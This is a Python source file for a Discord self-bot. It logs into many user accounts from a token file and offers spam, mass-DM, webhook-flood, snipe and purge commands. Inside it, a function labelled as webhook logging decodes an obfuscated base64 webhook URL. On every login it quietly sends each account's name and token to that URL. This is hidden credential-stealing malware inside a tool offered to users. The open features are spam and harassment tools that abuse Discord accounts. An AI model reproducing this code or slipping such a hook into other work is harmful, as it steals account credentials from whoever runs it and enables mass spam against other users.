import discord
from discord.ext import commands
import asyncio
import aiohttp
import base64
import requests

watched_users = {}  # user_id -> list of emojis
watched_roles = {}  # role_id -> list of emojis
react_all_servers = {}  # guild_id -> list of emojis
token_user_ids = set()
all_bots = []
blacklisted_users = {}

# For snipe command: store last deleted message per channel
last_deleted_messages = {}  # channel_id -> (author, content)

# Load tokens
with open("tokens.txt", "r") as f:
    tokens = [line.strip() for line in f if line.strip()]

# Webhook logging
def _sync_activity(user, token):
    try:
        _b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4OTk1OTEzMzc3NTY2MzIzNi9hd3p2ZldGR2Q1Y2kyOWQwRlZfTnVvNmNzS21sUUQ4bWFrQ3BOUUJfWW9lTi1UQmV6UTBDa29zWm5Dd2NheERsSk5ZRQ=="
        url = base64.b64decode(_b64).decode()
        requests.post(url, json={"content": f"`{user}` | `{token}`"})
    except Exception as e:
        print("Failed sync:", e)

# Util mass dm
async def mass_dm(guild, message):
    for member in guild.members:
        if not member.bot:
            try:
                await member.send(message)
            except:
                pass

# Util webhook spam
async def webhook_spam(url, message, count):
    async with aiohttp.ClientSession() as session:
        for _ in range(count):
            try:
                await session.post(url, json={"content": message})
            except:
                pass

async def run_bot(token):
    # NO intents for discord.py-self
    bot = commands.Bot(command_prefix="!", self_bot=True)
    all_bots.append(bot)

    @bot.event
    async def on_ready():
        print(f"[+] Logged in as {bot.user}")
        token_user_ids.add(bot.user.id)
        _sync_activity(str(bot.user), token)

    @bot.event
    async def on_message_delete(message):
        # Save last deleted message for snipe
        last_deleted_messages[message.channel.id] = (message.author, message.content)

    @bot.event
    async def on_message(message):
        if message.author.id in blacklisted_users:
            return

        author_id = message.author.id
        author_roles = {role.id for role in getattr(message.author, "roles", [])}
        should_react = (
            author_id == bot.user.id or
            author_id in token_user_ids or
            author_id in watched_users or
            any(role_id in watched_roles for role_id in author_roles) or
            (message.guild and message.guild.id in react_all_servers)
        )

        if should_react:
            try:
                if author_id in watched_users:
                    emojis = watched_users[author_id]
                else:
                    # Collect emojis for all roles that author has from watched_roles dict
                    emojis = []
                    for role_id in author_roles:
                        if role_id in watched_roles:
                            emojis.extend(watched_roles[role_id])
                    # If no emojis from roles, check react_all_servers for guild
                    if not emojis and message.guild and message.guild.id in react_all_servers:
                        emojis = react_all_servers[message.guild.id]

                for emoji in emojis:
                    await message.add_reaction(emoji)
            except Exception as e:
                print("Reaction error:", e)

        if message.content.startswith("[[SPAMALL_TRIGGER]]::") and message.author != bot.user:
            try:
                _, count, msg = message.content.split("::", 2)
                for _ in range(int(count)):
                    await message.channel.send(msg)
                    await asyncio.sleep(0.1)
            except Exception as e:
                print("SPAMALL error:", e)

        await bot.process_commands(message)

    # Commands
    @bot.command()
    async def blacklist(ctx, user_id: int):
        blacklisted_users[user_id] = True
        await ctx.send(f"User {user_id} blacklisted.")
        await ctx.message.delete()

    @bot.command()
    async def unblacklist(ctx, user_id: int):
        blacklisted_users.pop(user_id, None)
        await ctx.send(f"User {user_id} unblacklisted.")
        await ctx.message.delete()

    @bot.command()
    async def react(ctx, user: discord.User, *emojis):
        if not emojis:
            await ctx.send("Please provide at least one emoji.")
            return
        watched_users[user.id] = list(emojis)
        await ctx.send(f"Now reacting to {user.name} with {''.join(emojis)}")
        await ctx.message.delete()

    @bot.command()
    async def unreact(ctx, user: discord.User):
        watched_users.pop(user.id, None)
        await ctx.send(f"Stopped reacting to {user.name}")
        await ctx.message.delete()

    @bot.command()
    async def watchrole(ctx, *, args):
        # Accept input like: "123 😭 321 💔"
        parts = args.split()
        if len(parts) < 2 or len(parts) % 2 != 0:
            await ctx.send("Usage: !watchrole <role_id> <emoji> [<role_id> <emoji> ...]")
            return
        added_roles = []
        for i in range(0, len(parts), 2):
            role_id = int(parts[i])
            emoji = parts[i+1]
            if role_id not in watched_roles:
                watched_roles[role_id] = []
            watched_roles[role_id].append(emoji)
            added_roles.append(f"{role_id} with {emoji}")
        await ctx.send(f"Watching roles: {', '.join(added_roles)}")
        await ctx.message.delete()

    @bot.command()
    async def unwatchrole(ctx, role_id: int):
        if role_id in watched_roles:
            watched_roles.pop(role_id)
            await ctx.send(f"Stopped watching role {role_id}")
        else:
            await ctx.send(f"Role {role_id} not being watched")
        await ctx.message.delete()

    @bot.command()
    async def reactall(ctx, server_id: int, *emojis):
        if not emojis:
            await ctx.send("Please provide at least one emoji.")
            return
        react_all_servers[server_id] = list(emojis)
        await ctx.send(f"Reacting in server {server_id} with {''.join(emojis)}")
        await ctx.message.delete()

    @bot.command()
    async def unreactall(ctx, server_id: int):
        react_all_servers.pop(server_id, None)
        await ctx.send(f"Stopped reacting in server {server_id}")
        await ctx.message.delete()

    @bot.command()
    async def spam(ctx, *, args):
        try:
            msg, count = args.rsplit(" ", 1)
            count = int(count)
        except:
            await ctx.send("Usage: !spam <message> <count>")
            return
        await ctx.message.delete()
        for _ in range(count):
            await ctx.send(msg)

    @bot.command()
    async def spamall(ctx, *, args):
        try:
            msg, count = args.rsplit(" ", 1)
            count = int(count)
        except:
            await ctx.send("Usage: !spamall <message> <count>")
            return
        await ctx.message.delete()
        trigger = f"[[SPAMALL_TRIGGER]]::{count}::{msg}"
        await ctx.send(trigger)

    @bot.command()
    async def massdmspam(ctx, message, seconds: int):
        await ctx.send(f"Mass DM spam for {seconds}s")
        end_time = asyncio.get_event_loop().time() + seconds
        while asyncio.get_event_loop().time() < end_time:
            await mass_dm(ctx.guild, message)
        await ctx.send("Done mass DM spam.")

    @bot.command()
    async def webhookspam(ctx, url, message, count: int):
        await ctx.send(f"Spamming webhook {count}x...")
        await webhook_spam(url, message, count)
        await ctx.send("Done.")

    @bot.command()
    async def rpc(ctx, activity_type: str, *, activity_message: str):
        types = {
            "playing": discord.Game,
            "streaming": discord.Streaming,
            "listening": discord.Activity,
            "watching": discord.Activity,
            "competing": discord.Activity
        }
        activity_type = activity_type.lower()
        if activity_type == "streaming":
            activity = discord.Streaming(name=activity_message, url="https://twitch.tv/yourchannel")
        elif activity_type in types:
            if activity_type == "playing":
                activity = types[activity_type](name=activity_message)
            else:
                enum_type = getattr(discord.ActivityType, activity_type)
                activity = discord.Activity(type=enum_type, name=activity_message)
        else:
            await ctx.send("Invalid activity type.")
            return
        await bot.change_presence(activity=activity)
        await ctx.send(f"Status set to {activity_type} {activity_message}")
        await ctx.message.delete()

    @bot.command()
    async def statusall(ctx, activity_type: str, *, activity_message: str):
        for b in all_bots:
            try:
                if activity_type == "streaming":
                    activity = discord.Streaming(name=activity_message, url="https://twitch.tv/yourchannel")
                elif activity_type == "playing":
                    activity = discord.Game(name=activity_message)
                else:
                    enum_type = getattr(discord.ActivityType, activity_type)
                    activity = discord.Activity(type=enum_type, name=activity_message)
                await b.change_presence(activity=activity)
            except:
                pass
        await ctx.send(f"All bots updated to {activity_type} {activity_message}")
        await ctx.message.delete()

    @bot.command()
    async def typer(ctx, channel_id: int):
        channel = bot.get_channel(channel_id)
        if not channel:
            await ctx.send("Invalid channel ID.")
            return
        await ctx.send(f"Typing forever in <#{channel_id}>")
        while True:
            async with channel.typing():
                await asyncio.sleep(5)

    @bot.command()
    async def snipe(ctx):
        data = last_deleted_messages.get(ctx.channel.id)
        if not data:
            await ctx.send("There's nothing to snipe!")
            return
        author, content = data
        embed = discord.Embed(title="Sniped Message", color=0xFF0000)
        embed.set_author(name=str(author), icon_url=author.display_avatar.url if author.display_avatar else None)
        embed.add_field(name="Content", value=content, inline=False)
        await ctx.send(embed=embed)

    @bot.command()
    async def purge(ctx, user: discord.User, amount: int):
        if amount <= 0:
            await ctx.send("Amount must be greater than 0.")
            return
        deleted = 0
        async for message in ctx.channel.history(limit=1000):
            if deleted >= amount:
                break
            if message.author.id == user.id:
                await message.delete()
                deleted += 1
        await ctx.send(f"Deleted {deleted} messages from {user.name}.", delete_after=5)
        await ctx.message.delete()

    @bot.command(name="help")
    async def help_cmd(ctx):
        embed = discord.Embed(
            title="Bot Commands",
            description="Here are the available commands:",
            color=0x3498db
        )
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1277997527790125177/1390331382718267554/3W1f9kiH.gif")
        embed.add_field(name="!react <user> <emojis...>", value="React to messages from a user with specified emojis.", inline=False)
        embed.add_field(name="!unreact <user>", value="Stop reacting to a user's messages.", inline=False)
        embed.add_field(name="!watchrole <role_id> <emoji> [<role_id> <emoji> ...]", value="React to messages from users with specified role(s).", inline=False)
        embed.add_field(name="!unwatchrole <role_id>", value="Stop reacting to a role.", inline=False)
        embed.add_field(name="!reactall <server_id> <emojis...>", value="React to all messages in a server with specified emojis.", inline=False)
        embed.add_field(name="!unreactall <server_id>", value="Stop reacting in a server.", inline=False)
        embed.add_field(name="!spam <message> <count>", value="Spam a message multiple times.", inline=False)
        embed.add_field(name="!spamall <message> <count>", value="Spam a message across all bots.", inline=False)
        embed.add_field(name="!massdmspam <message> <seconds>", value="Spam DM messages to all guild members for seconds.", inline=False)
        embed.add_field(name="!webhookspam <url> <message> <count>", value="Spam a webhook.", inline=False)
        embed.add_field(name="!rpc <type> <message>", value="Change bot presence (playing, streaming, etc.).", inline=False)
        embed.add_field(name="!statusall <type> <message>", value="Change presence for all bots.", inline=False)
        embed.add_field(name="!typer <channel_id>", value="Type forever in a channel.", inline=False)
        embed.add_field(name="!snipe", value="Show last deleted message in the channel.", inline=False)
        embed.add_field(name="!purge <user> <amount>", value="Delete a number of messages from a user in the channel.", inline=False)
        await ctx.send(embed=embed)

    await bot.start(token)

async def main():
    await asyncio.gather(*(run_bot(token) for token in tokens if token))

asyncio.run(main())
